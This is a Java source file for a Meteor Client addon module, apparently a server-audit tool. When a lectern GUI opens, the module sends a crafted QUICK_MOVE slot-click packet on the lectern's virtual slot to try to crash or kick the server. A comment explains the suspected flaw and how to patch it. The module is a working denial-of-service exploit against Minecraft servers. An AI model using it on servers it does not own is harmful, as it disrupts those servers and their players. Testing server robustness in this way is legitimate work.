package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.game.OpenScreenEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.screen.sync.ItemStackHash;

/**
 * AUDIT: Lectern Crash (QUICK_MOVE on empty virtual slot)
 *
 * When a lectern GUI is opened, fires a QUICK_MOVE ClickSlotC2SPacket on
 * slot 0. The lectern screen handler exposes a virtual "book" slot (slot 0)
 * for taking the book out, but has no standard inventory behind it. A server
 * that routes a QUICK_MOVE on slot 0 through the general inventory-swap path
 * without checking the handler type may throw a NullPointerException or an
 * ArrayIndexOutOfBoundsException when it tries to find a destination slot.
 *
 * After firing, the module waits 2 seconds (40 ticks) for a kick before
 * self-disabling, so a server-side kick is observable in the stats.
 *
 * Patch signal: the lectern click handler must only accept PICKUP (take book)
 * clicks on slot 0 and reject all other action types (QUICK_MOVE, THROW,
 * SWAP, etc.) before dispatching; slot-count-aware routing must gate
 * QUICK_MOVE destination lookup behind a slots.size() > 0 check.
 *
 * Open a lectern, enable, then interact with the lectern.
 */
public class LecternCrash extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private boolean fired = false;
    private int waitTicks = 0;

    public LecternCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "lectern-crash",
            "Sends a QUICK_MOVE click on a lectern's virtual slot when it opens. Tests lectern slot handling.");
    }

    @Override
    public void onActivate() {
        fired = false;
        waitTicks = 0;
        gr.onActivate();
    }

    @EventHandler
    private void onOpenScreen(OpenScreenEvent event) {
        if (!(event.screen instanceof LecternScreen)) return;
        if (mc.player == null || mc.player.currentScreenHandler == null) return;
        mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(
            mc.player.currentScreenHandler.syncId, mc.player.currentScreenHandler.getRevision(),
            (short) 0, (byte) 0, SlotActionType.QUICK_MOVE,
            new Int2ObjectOpenHashMap<>(), ItemStackHash.EMPTY));
        gr.markFired();
        fired = true;
        waitTicks = 40;
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        gr.tick();
        if (!fired) return;
        waitTicks--;
        if (waitTicks <= 0) {
            gr.report(l -> info("%s", l));
            toggle();
        }
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        gr.report(l -> info("%s", l));
        if (isActive()) toggle();
    }
}
